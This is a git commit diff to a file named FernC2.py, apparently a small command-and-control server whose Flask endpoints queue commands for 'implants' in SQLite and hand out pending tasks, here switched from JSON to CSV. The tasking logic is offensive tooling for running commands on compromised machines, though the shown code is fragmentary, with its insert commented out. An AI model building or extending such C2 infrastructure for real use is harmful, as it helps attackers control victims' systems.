f1b73bbbae6b6310a848f138e43251692a71f775
Kibov <bartek01322@gmail.com>
2023-09-10 18:30:40 +0200

    changing from json to csv

--- Server/FernC2.py
+++ Server/FernC2.py
@@ -1,30 +1,38 @@
 from flask import Flask, request
 from flask_restful import Api, Resource
-
 import sqlite3
 
 
 class Tasks(Resource):
     def get(self):
-        conn = get_db_connection()
-        cursor = conn.cursor()
-        cursor.execute("SELECT * FROM tasks WHERE executed IS NOT 1")
-        rows = cursor.fetchall()
-
-        tasks = [dict(row) for row in rows]
-
-        conn.close()
-
-        return tasks, 200
-    def post(self):
         try:
-            data = request.get_json()
-            implant_id = data['implant_id']
-            command = data['command']
-
             conn = get_db_connection()
             cursor = conn.cursor()
-            cursor.execute("INSERT INTO tasks (implant_id, command) VALUES (?, ?)", (implant_id, command))
+            cursor.execute("SELECT * FROM tasks WHERE executed IS NOT 1")
+            rows = cursor.fetchall()
+
+            # Convert the rows to a CSV string
+            csv_string = ""
+            if rows:
+                for row in rows:
+                    csv_string += ",".join(map(str, row)) + "\n"
+
+            conn.close()
+
+            return csv_string, 200
+        except Exception as e:
+            return {"Error": str(e)}, 500
+    def post(self):
+        try:
+            if request.remote_addr != '127.0.0.1':
+               return {"Error": "Access denied"}, 403
+            data = request.get_data().decode().split(',')
+            implant_id = data[0]
+            command = data[1]
+            print(data[1])
+            conn = get_db_connection()
+            cursor = conn.cursor()
+            #cursor.execute("INSERT INTO tasks (implant_id, command) VALUES (?, ?)", (implant_id, command))
             conn.commit()
             conn.close()
             return "Task added successfully!", 201
